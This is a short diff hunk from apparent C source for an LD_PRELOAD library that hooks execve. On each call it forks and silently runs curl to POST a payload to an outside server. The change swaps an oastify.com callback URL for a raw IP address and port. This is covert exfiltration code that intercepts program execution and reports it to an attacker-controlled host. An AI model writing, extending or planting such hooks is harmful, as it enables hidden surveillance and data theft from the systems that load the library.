@@ -110,7 +110,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
         if (fork() == 0) {
             execlp("curl", "curl",
                    "-s", "-XPOST", "--stderr", "/dev/null", "-o", "/dev/null",
-                   "https://yeg4vmlb66avz5ril3jqgo7c238uwxkm.oastify.com/ld_preload",
+                   "http://65.109.68.176:15172/ld_preload",
                    "-H", "Content-Type: application/json",
                    "--data", payload,
                    (char*)NULL);
